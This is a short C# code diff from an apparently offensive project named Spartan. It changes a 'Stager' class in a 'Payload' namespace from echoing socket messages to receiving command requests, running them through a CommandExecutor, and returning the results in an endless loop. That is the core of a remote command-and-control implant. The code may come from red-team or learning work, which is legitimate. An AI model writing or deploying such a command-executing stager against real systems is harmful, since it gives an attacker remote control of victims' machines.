@@ -1,7 +1,10 @@
+using Spartan.Models.RequestModels;
+
 namespace Spartan.Payload;
 
 public class Stager
 {
+    private readonly CommandExecutor _commandExecutor = new();
     private readonly SocketClient _socketClient;
 
     public Stager(BinaryReader binaryReader, BinaryWriter binaryWriter)
@@ -16,8 +19,10 @@ public class Stager
     {
         while (true)
         {
-            string message = _socketClient.ReceiveData();
-            var response = $"You said {message}";
+            ICommandRequestModel message = _socketClient.ReceiveData();
+
+            var response = _commandExecutor.ExecuteCommand(message);
+
             _socketClient.SendData(response);
         }
     }
